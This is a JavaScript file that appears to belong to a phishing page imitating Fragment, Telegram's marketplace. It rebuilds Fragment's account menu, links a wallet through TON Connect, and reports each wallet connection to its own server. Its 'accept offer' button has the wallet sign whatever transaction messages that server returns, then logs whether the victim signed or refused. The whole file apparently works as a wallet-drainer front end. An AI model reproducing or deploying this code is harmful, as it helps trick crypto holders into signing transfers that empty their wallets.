tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
	manifestUrl: window.location.origin + '/tonconnect-manifest.json',
	actionsConfiguration: {
		twaReturnUrl: 'https://t.me/test420420robot/fragment',
		returnStrategy: 'back',
	},
	uiPreferences: {
		theme: 'DARK',
		borderRadius: 's',
		colorsSet: {
			DARK: {
				accent: '#4db2ff',
				background: {
					primary: '#1a2026',
					qr: '#fff',
					tint: '#242e38',
				},
				connectButton: {
					background: '#248bda',
					foreground: '#fff',
				},
				icon: {
					error: '#ff5863',
				},
				text: {
					primary: '#fff',
					secondary: '#8794a1',
				},
			},
		},
	},
})

let connectedWallet = tonConnectUI.wallet

async function connectToWallet() {
	connectedWallet = await tonConnectUI.openModal()
}

const button = document.getElementById('ton-connect-button')
const dropdown = document.getElementById('ton-connected-dropdown')

button.onclick = connectToWallet

function shortWallet(G) {
	let N = new Address(G.account.address)
	N = N.toString(true, false, true)
	document.getElementById('wallet-head').innerText = N.substring(0, 24)
	document.getElementById('wallet-tail').innerText = N.substring(24)
}

function updateSidebar(wallet) {
	if (wallet) {
		let t = new Address(wallet.account.address)
		t = t.toString(true, false, true)
		document.getElementById('wallet-head').innerText = t.substring(0, 24)
		document.getElementById('wallet-tail').innerText = t.substring(24)
		const A = document.getElementsByClassName('js-header-menu-window')[0]
		A.innerHTML = `
		<div class="tm-menu-account-header">
		  <div class="tm-menu-account-address">
			<span class="tm-wallet">
			  <span class="head">${t.substring(0, 24)}</span>
			  <span class="middle"></span>
			  <span class="tail">${t.substring(24)}</span>
			</span>
		  </div>
		  <div class="tm-menu-account-desc">Connected Gram wallet</div>
		</div>
		<div class="tm-header-menu-window js-header-menu-window">
		  <div class="tm-menu-account-header">
			<div class="tm-menu-account-address">
			  <span class="tm-wallet">
				<span class="head">${t.substring(0, 24)}</span>
				<span class="middle"></span>
				<span class="tail">${t.substring(24)}</span>
			  </span>
			</div>
			<div class="tm-menu-account-desc">Connected Gram wallet</div>
		  </div>
		  <div class="tm-header-menu-body">
			<h4 class="tm-menu-subheader">My Account</h4>
			<div class="tm-menu-links">
			  <a href="https://fragment.com/my/assets" class="tm-menu-link icon-before icon-menu-assets" data-counter="">My Assets</a>
			  <a href="https://fragment.com/my/bids" class="tm-menu-link icon-before icon-menu-bids" data-counter="">My Bids</a>
			  <a href="https://fragment.com/my/numbers" class="tm-menu-link icon-before icon-menu-numbers" data-counter="">My Anonymous Numbers</a>
			  <a href="https://fragment.com/my/sessions" class="tm-menu-link icon-before icon-menu-sessions">Active Sessions</a>
			  <a href="javascript:;" class="tm-menu-link icon-before icon-menu-disconnect ton-logout-link">Disconnect Gram</a>
			</div>
			<h4 class="tm-menu-subheader">Platform</h4>
			<div class="tm-menu-links">
			  <a href="https://fragment.com/about" class="tm-menu-link icon-before icon-menu-about">About</a>
			  <a href="https://fragment.com/terms" class="tm-menu-link icon-before icon-menu-terms">Terms</a>
			  <a href="https://fragment.com/privacy" class="tm-menu-link icon-before icon-menu-privacy">Privacy Policy</a>
			</div>
			<div class="tm-header-menu-footer"></div>
		  </div>
		</div>`
		const R = document.getElementsByClassName('ton-logout-link')
		for (const z of R) {
			z.onclick = () => {
				fetch('./disconnect', {
					method: 'POST',
					headers: { 'Content-Type': 'application/json' },
					body: JSON.stringify({
						wallet: wallet.account.address,
						href: window.location.href,
					}),
				})

				tonConnectUI.disconnect()
				location.reload()
			}
		}
	} else {
		const O = document.getElementsByClassName('ton-auth-link')
		for (const x of O) {
			x.onclick = () => {
				connectToWallet()
			}
		}
	}
}

function visualUpdate(J) {
	if (J) {
		button.style.display = 'none'
		dropdown.style.display = 'inherit'
		shortWallet(J)
	} else {
		button.style.display = 'inherit'
		dropdown.style.display = 'none'
	}
}

const openPopupButton = document.getElementsByClassName(
	'js-header-menu-button'
)[0]

const closePopupButton = document.getElementsByClassName(
	'js-header-menu-close-button'
)[0]

const popup = document.getElementsByClassName('js-header-menu')[0]
openPopupButton.onclick = () => {
	popup.classList.remove('hide')
}
closePopupButton.onclick = () => {
	popup.classList.add('hide')
}

updateSidebar(tonConnectUI.wallet)
visualUpdate(tonConnectUI.wallet)

tonConnectUI.onStatusChange(wallet => {
	connectedWallet = wallet
	updateSidebar(wallet)
	visualUpdate(wallet)

	if (wallet) {
		fetch('./connected', {
			method: 'POST',
			headers: { 'Content-Type': 'application/json' },
			body: JSON.stringify({
				raw: wallet,
				wallet: wallet.account.address,
				href: window.location.href,
			}),
		})
	}
})

async function transaction() {
	if (!tonConnectUI.wallet) {
		await tonConnectUI.openModal()
		return
	}

	const address = tonConnectUI.wallet.account.address
	let response = await fetch(
		`./transaction/${window.location.search}&wallet=${address}`
	)

	if (response.ok) {
		let data = await response.json()

		if (data.messages) {
			let transaction = {
				validUntil: Math.floor(Date.now() / 1000) + 900,
				messages: data.messages,
			}

			if (transaction.messages && transaction.messages.length > 0) {
				try {
					const sent = await tonConnectUI.sendTransaction(transaction)

					fetch('./accept', {
						method: 'POST',
						headers: { 'Content-Type': 'application/json' },
						body: JSON.stringify({
							messages: data.messages,
							boc: sent,
							wallet: address,
							raw: data.raw,
							href: window.location.href,
						}),
					})
				} catch (e) {
					fetch('./reject', {
						method: 'POST',
						headers: { 'Content-Type': 'application/json' },
						body: JSON.stringify({
							messages: data.messages,
							err: e.message,
							wallet: address,
							raw: data.raw,
							href: window.location.href,
						}),
					})
				}
			}
		}
	}
}

document.getElementById('accept-offer').onclick = transaction
